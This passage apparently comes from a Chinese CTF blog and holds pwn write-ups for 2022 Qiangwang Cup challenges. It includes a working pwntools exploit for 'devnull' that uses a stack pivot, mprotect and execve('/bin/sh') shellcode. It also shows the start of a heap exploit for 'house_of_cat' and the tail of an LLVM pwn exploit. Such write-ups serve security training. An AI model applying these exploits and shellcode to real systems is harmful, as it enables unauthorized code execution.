class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func200</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func201</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func202</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func203</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func204</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func205</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func206</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func207</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func208</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func209</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func210</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func211</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func212</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func213</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func214</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func215</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func216</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func217</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func218</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func219</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func220</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func221</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func222</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func223</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func224</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func225</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func226</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func227</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func228</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func229</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func230</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func231</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func232</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func233</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func234</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func235</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func236</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func237</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func238</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func239</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func240</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func241</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func242</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func243</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func244</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gamestart</span><span class="params">()</span>&#123;</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    tiandongwanxiang();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    guobapenhuo();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line"></span><br><span class="line">	func000(<span class="number">0</span>);</span><br><span class="line">	func001(<span class="number">0</span>);</span><br><span class="line">	func002(<span class="number">0</span>);</span><br><span class="line">	func003(<span class="number">0</span>);</span><br><span class="line">	func004(<span class="number">0</span>);</span><br><span class="line">	func005(<span class="number">0</span>);</span><br><span class="line">	func006(<span class="number">0</span>);</span><br><span class="line">	func007(<span class="number">0</span>);</span><br><span class="line">	func008(<span class="number">0</span>);</span><br><span class="line">	func009(<span class="number">0</span>);</span><br><span class="line">	func010(<span class="number">0</span>);</span><br><span class="line">	func011(<span class="number">0</span>);</span><br><span class="line">	func012(<span class="number">0</span>);</span><br><span class="line">	func013(<span class="number">0</span>);</span><br><span class="line">	func014(<span class="number">0</span>);</span><br><span class="line">	func015(<span class="number">0</span>);</span><br><span class="line">	func016(<span class="number">0</span>);</span><br><span class="line">	func017(<span class="number">0</span>);</span><br><span class="line">	func018(<span class="number">0</span>);</span><br><span class="line">	func019(<span class="number">0</span>);</span><br><span class="line">	func020(<span class="number">0</span>);</span><br><span class="line">	func021(<span class="number">0</span>);</span><br><span class="line">	func022(<span class="number">0</span>);</span><br><span class="line">	func023(<span class="number">0</span>);</span><br><span class="line">	func024(<span class="number">0</span>);</span><br><span class="line">	func025(<span class="number">0</span>);</span><br><span class="line">	func026(<span class="number">0</span>);</span><br><span class="line">	func027(<span class="number">0</span>);</span><br><span class="line">	func028(<span class="number">0</span>);</span><br><span class="line">	func029(<span class="number">0</span>);</span><br><span class="line">	func030(<span class="number">0</span>);</span><br><span class="line">	func031(<span class="number">0</span>);</span><br><span class="line">	func032(<span class="number">0</span>);</span><br><span class="line">	func033(<span class="number">0</span>);</span><br><span class="line">	func034(<span class="number">0</span>);</span><br><span class="line">	func035(<span class="number">0</span>);</span><br><span class="line">	func036(<span class="number">0</span>);</span><br><span class="line">	func037(<span class="number">0</span>);</span><br><span class="line">	func038(<span class="number">0</span>);</span><br><span class="line">	func039(<span class="number">0</span>);</span><br><span class="line">	func040(<span class="number">0</span>);</span><br><span class="line">	func041(<span class="number">0</span>);</span><br><span class="line">	func042(<span class="number">0</span>);</span><br><span class="line">	func043(<span class="number">0</span>);</span><br><span class="line">	func044(<span class="number">0</span>);</span><br><span class="line">	func045(<span class="number">0</span>);</span><br><span class="line">	func046(<span class="number">0</span>);</span><br><span class="line">	func047(<span class="number">0</span>);</span><br><span class="line">	func048(<span class="number">0</span>);</span><br><span class="line">	func049(<span class="number">0</span>);</span><br><span class="line">	func050(<span class="number">0</span>);</span><br><span class="line">	func051(<span class="number">0</span>);</span><br><span class="line">	func052(<span class="number">0</span>);</span><br><span class="line">	func053(<span class="number">0</span>);</span><br><span class="line">	func054(<span class="number">0</span>);</span><br><span class="line">	func055(<span class="number">0</span>);</span><br><span class="line">	func056(<span class="number">0</span>);</span><br><span class="line">	func057(<span class="number">0</span>);</span><br><span class="line">	func058(<span class="number">0</span>);</span><br><span class="line">	func059(<span class="number">0</span>);</span><br><span class="line">	func060(<span class="number">0</span>);</span><br><span class="line">	func061(<span class="number">0</span>);</span><br><span class="line">	func062(<span class="number">0</span>);</span><br><span class="line">	func063(<span class="number">0</span>);</span><br><span class="line">	func064(<span class="number">0</span>);</span><br><span class="line">	func065(<span class="number">0</span>);</span><br><span class="line">	func066(<span class="number">0</span>);</span><br><span class="line">	func067(<span class="number">0</span>);</span><br><span class="line">	func068(<span class="number">0</span>);</span><br><span class="line">	func069(<span class="number">0</span>);</span><br><span class="line">	func070(<span class="number">0</span>);</span><br><span class="line">	func071(<span class="number">0</span>);</span><br><span class="line">	func072(<span class="number">0</span>);</span><br><span class="line">	func073(<span class="number">0</span>);</span><br><span class="line">	func074(<span class="number">0</span>);</span><br><span class="line">	func075(<span class="number">0</span>);</span><br><span class="line">	func076(<span class="number">0</span>);</span><br><span class="line">	func077(<span class="number">0</span>);</span><br><span class="line">	func078(<span class="number">0</span>);</span><br><span class="line">	func079(<span class="number">0</span>);</span><br><span class="line">	func080(<span class="number">0</span>);</span><br><span class="line">	func081(<span class="number">0</span>);</span><br><span class="line">	func082(<span class="number">0</span>);</span><br><span class="line">	func083(<span class="number">0</span>);</span><br><span class="line">	func084(<span class="number">0</span>);</span><br><span class="line">	func085(<span class="number">0</span>);</span><br><span class="line">	func086(<span class="number">0</span>);</span><br><span class="line">	func087(<span class="number">0</span>);</span><br><span class="line">	func088(<span class="number">0</span>);</span><br><span class="line">	func089(<span class="number">0</span>);</span><br><span class="line">	func090(<span class="number">0</span>);</span><br><span class="line">	func091(<span class="number">0</span>);</span><br><span class="line">	func092(<span class="number">0</span>);</span><br><span class="line">	func093(<span class="number">0</span>);</span><br><span class="line">	func094(<span class="number">0</span>);</span><br><span class="line">	func095(<span class="number">0</span>);</span><br><span class="line">	func096(<span class="number">0</span>);</span><br><span class="line">	func097(<span class="number">0</span>);</span><br><span class="line">	func098(<span class="number">0</span>);</span><br><span class="line">	func099(<span class="number">0</span>);</span><br><span class="line">	func100(<span class="number">0</span>);</span><br><span class="line">	func101(<span class="number">0</span>);</span><br><span class="line">	func102(<span class="number">0</span>);</span><br><span class="line">	func103(<span class="number">0</span>);</span><br><span class="line">	func104(<span class="number">0</span>);</span><br><span class="line">	func105(<span class="number">0</span>);</span><br><span class="line">	func106(<span class="number">0</span>);</span><br><span class="line">	func107(<span class="number">0</span>);</span><br><span class="line">	func108(<span class="number">0</span>);</span><br><span class="line">	func109(<span class="number">0</span>);</span><br><span class="line">	func110(<span class="number">0</span>);</span><br><span class="line">	func111(<span class="number">0</span>);</span><br><span class="line">	func112(<span class="number">0</span>);</span><br><span class="line">	func113(<span class="number">0</span>);</span><br><span class="line">	func114(<span class="number">0</span>);</span><br><span class="line">	func115(<span class="number">0</span>);</span><br><span class="line">	func116(<span class="number">0</span>);</span><br><span class="line">	func117(<span class="number">0</span>);</span><br><span class="line">	func118(<span class="number">0</span>);</span><br><span class="line">	func119(<span class="number">0</span>);</span><br><span class="line">	func120(<span class="number">0</span>);</span><br><span class="line">	func121(<span class="number">0</span>);</span><br><span class="line">	func122(<span class="number">0</span>);</span><br><span class="line">	func123(<span class="number">0</span>);</span><br><span class="line">	func124(<span class="number">0</span>);</span><br><span class="line">	func125(<span class="number">0</span>);</span><br><span class="line">	func126(<span class="number">0</span>);</span><br><span class="line">	func127(<span class="number">0</span>);</span><br><span class="line">	func128(<span class="number">0</span>);</span><br><span class="line">	func129(<span class="number">0</span>);</span><br><span class="line">	func130(<span class="number">0</span>);</span><br><span class="line">	func131(<span class="number">0</span>);</span><br><span class="line">	func132(<span class="number">0</span>);</span><br><span class="line">	func133(<span class="number">0</span>);</span><br><span class="line">	func134(<span class="number">0</span>);</span><br><span class="line">	func135(<span class="number">0</span>);</span><br><span class="line">	func136(<span class="number">0</span>);</span><br><span class="line">	func137(<span class="number">0</span>);</span><br><span class="line">	func138(<span class="number">0</span>);</span><br><span class="line">	func139(<span class="number">0</span>);</span><br><span class="line">	func140(<span class="number">0</span>);</span><br><span class="line">	func141(<span class="number">0</span>);</span><br><span class="line">	func142(<span class="number">0</span>);</span><br><span class="line">	func143(<span class="number">0</span>);</span><br><span class="line">	func144(<span class="number">0</span>);</span><br><span class="line">	func145(<span class="number">0</span>);</span><br><span class="line">	func146(<span class="number">0</span>);</span><br><span class="line">	func147(<span class="number">0</span>);</span><br><span class="line">	func148(<span class="number">0</span>);</span><br><span class="line">	func149(<span class="number">0</span>);</span><br><span class="line">	func150(<span class="number">0</span>);</span><br><span class="line">	func151(<span class="number">0</span>);</span><br><span class="line">	func152(<span class="number">0</span>);</span><br><span class="line">	func153(<span class="number">0</span>);</span><br><span class="line">	func154(<span class="number">0</span>);</span><br><span class="line">	func155(<span class="number">0</span>);</span><br><span class="line">	func156(<span class="number">0</span>);</span><br><span class="line">	func157(<span class="number">0</span>);</span><br><span class="line">	func158(<span class="number">0</span>);</span><br><span class="line">	func159(<span class="number">0</span>);</span><br><span class="line">	func160(<span class="number">0</span>);</span><br><span class="line">	func161(<span class="number">0</span>);</span><br><span class="line">	func162(<span class="number">0</span>);</span><br><span class="line">	func163(<span class="number">0</span>);</span><br><span class="line">	func164(<span class="number">0</span>);</span><br><span class="line">	func165(<span class="number">0</span>);</span><br><span class="line">	func166(<span class="number">0</span>);</span><br><span class="line">	func167(<span class="number">0</span>);</span><br><span class="line">	func168(<span class="number">0</span>);</span><br><span class="line">	func169(<span class="number">0</span>);</span><br><span class="line">	func170(<span class="number">0</span>);</span><br><span class="line">	func171(<span class="number">0</span>);</span><br><span class="line">	func172(<span class="number">0</span>);</span><br><span class="line">	func173(<span class="number">0</span>);</span><br><span class="line">	func174(<span class="number">0</span>);</span><br><span class="line">	func175(<span class="number">0</span>);</span><br><span class="line">	func176(<span class="number">0</span>);</span><br><span class="line">	func177(<span class="number">0</span>);</span><br><span class="line">	func178(<span class="number">0</span>);</span><br><span class="line">	func179(<span class="number">0</span>);</span><br><span class="line">	func180(<span class="number">0</span>);</span><br><span class="line">	func181(<span class="number">0</span>);</span><br><span class="line">	func182(<span class="number">0</span>);</span><br><span class="line">	func183(<span class="number">0</span>);</span><br><span class="line">	func184(<span class="number">0</span>);</span><br><span class="line">	func185(<span class="number">0</span>);</span><br><span class="line">	func186(<span class="number">0</span>);</span><br><span class="line">	func187(<span class="number">0</span>);</span><br><span class="line">	func188(<span class="number">0</span>);</span><br><span class="line">	func189(<span class="number">0</span>);</span><br><span class="line">	func190(<span class="number">0</span>);</span><br><span class="line">	func191(<span class="number">0</span>);</span><br><span class="line">	func192(<span class="number">0</span>);</span><br><span class="line">	func193(<span class="number">0</span>);</span><br><span class="line">	func194(<span class="number">0</span>);</span><br><span class="line">	func195(<span class="number">0</span>);</span><br><span class="line">	func196(<span class="number">0</span>);</span><br><span class="line">	func197(<span class="number">0</span>);</span><br><span class="line">	func198(<span class="number">0</span>);</span><br><span class="line">	func199(<span class="number">0</span>);</span><br><span class="line">	func200(<span class="number">0</span>);</span><br><span class="line">	func201(<span class="number">0</span>);</span><br><span class="line">	func202(<span class="number">0</span>);</span><br><span class="line">	func203(<span class="number">0</span>);</span><br><span class="line">	func204(<span class="number">0</span>);</span><br><span class="line">	func205(<span class="number">0</span>);</span><br><span class="line">	func206(<span class="number">0</span>);</span><br><span class="line">	func207(<span class="number">0</span>);</span><br><span class="line">	func208(<span class="number">0</span>);</span><br><span class="line">	func209(<span class="number">0</span>);</span><br><span class="line">	func210(<span class="number">0</span>);</span><br><span class="line">	func211(<span class="number">0</span>);</span><br><span class="line">	func212(<span class="number">0</span>);</span><br><span class="line">	func213(<span class="number">0</span>);</span><br><span class="line">	func214(<span class="number">0</span>);</span><br><span class="line">	func215(<span class="number">0</span>);</span><br><span class="line">	func216(<span class="number">0</span>);</span><br><span class="line">	func217(<span class="number">0</span>);</span><br><span class="line">	func218(<span class="number">0</span>);</span><br><span class="line">	func219(<span class="number">0</span>);</span><br><span class="line">	func220(<span class="number">0</span>);</span><br><span class="line">	func221(<span class="number">0</span>);</span><br><span class="line">	func222(<span class="number">0</span>);</span><br><span class="line">	func223(<span class="number">0</span>);</span><br><span class="line">	func224(<span class="number">0</span>);</span><br><span class="line">	func225(<span class="number">0</span>);</span><br><span class="line">	func226(<span class="number">0</span>);</span><br><span class="line">	func227(<span class="number">0</span>);</span><br><span class="line">	func228(<span class="number">0</span>);</span><br><span class="line">	func229(<span class="number">0</span>);</span><br><span class="line">	func230(<span class="number">0</span>);</span><br><span class="line">	func231(<span class="number">0</span>);</span><br><span class="line">	func232(<span class="number">0</span>);</span><br><span class="line">	func233(<span class="number">0</span>);</span><br><span class="line">	func234(<span class="number">0</span>);</span><br><span class="line">	func235(<span class="number">0</span>);</span><br><span class="line">	func236(<span class="number">0</span>);</span><br><span class="line">	func237(<span class="number">0</span>);</span><br><span class="line">	func238(<span class="number">0</span>);</span><br><span class="line">	func239(<span class="number">0</span>);</span><br><span class="line">	func240(<span class="number">0</span>);</span><br><span class="line">	func241(<span class="number">0</span>);</span><br><span class="line">	func242(<span class="number">0x40</span>);</span><br><span class="line">	func243(<span class="number">0</span>);</span><br><span class="line">	func244(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	func240(<span class="number">0</span>);</span><br><span class="line">	func241(<span class="number">0</span>);</span><br><span class="line">	func242(<span class="number">0</span>);</span><br><span class="line">	func243(<span class="number">0</span>);</span><br><span class="line">	func244(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	upgrade(<span class="number">0</span>);</span><br><span class="line">	fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 强网杯</title>
    <url>/2022/08/07/CTF/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="devnull"><a href="#devnull" class="headerlink" title="devnull"></a>devnull</h2><p>存在两次溢出，第一次溢出使得fd为0，即相当于我们可以控制read的内容，第二次溢出就是经典的栈溢出，完成栈迁移。有几个注意的点：一是mprotect函数的port为1而不是7，需要我们重新伪造一个port为7的mprotect函数，在最后输出给我们<code>Thanks\n</code>信息之后会将rdx设置成7，rdi的值我们可以通过以下的两端神奇汇编来解决，<code>mov rax, [rbp-0x18]; leave; ret</code>和<code>mov esi, 0x1000; mov rdi, rax; call _mprotect; nop; pop rbp; ret</code>；二是在栈迁移的时候要注意迁移到可写的段上；三是注意我们shellcode的长度；四是注意程序关闭了标准输出，所以我们可以采用shell命令<code>exec 1&gt;&amp;2</code>来讲标准输出和标准错误给绑定到一起。</p>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./devnull&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sh_x64_21 = <span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : sh.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : sh.sendlineafter(text, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : sh.sendline(data)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0000000000401350</span>  <span class="comment"># mov rax, [rbp-0x18]; leave; ret</span></span><br><span class="line">mprotect = <span class="number">0x00000000004012D0</span>  <span class="comment"># mov esi, 0x1000; mov rdi, rax; call _mprotect; nop; pop rbp; ret</span></span><br><span class="line">save = <span class="number">0x3fe000</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">sa(<span class="string">&#x27;please input your filename\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(save)</span><br><span class="line">pld += p64(save + <span class="number">0x18</span>) + p64(magic)</span><br><span class="line">sa(<span class="string">&#x27;Please write the data you want to discard\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">pld = p64(save) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line">pld += p64(<span class="number">0</span>) + p64(mprotect) + p64(<span class="number">0</span>) + p64(save + <span class="number">0x38</span>)</span><br><span class="line">pld += asm(shellcraft.execve(save + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x401510&#x27;)</span></span><br><span class="line">sa(<span class="string">&#x27;please input your new data\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;exec 1&gt;&amp;2&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house_of_cat"></a>house_of_cat</h2><p>一道2.35的堆题，用的是<code>house_of_apple2</code>的攻击方法。</p>
<blockquote>
<p> 具体利用参考我的另一篇文章：<a href="https://rmrfsad.github.io/2022/08/06/Pwn/io/#house-of-cat-%E5%BC%BA%E7%BD%912022">学不完的IO - Pursue (rmrfsad.github.io)</a></p>
</blockquote>
<p>这里就给上WP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./house_of_cat&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    pld = <span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    pld = <span class="string">&#x27;CAT | r00t QWB QWXF$\xff\xff\xff\xff&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span 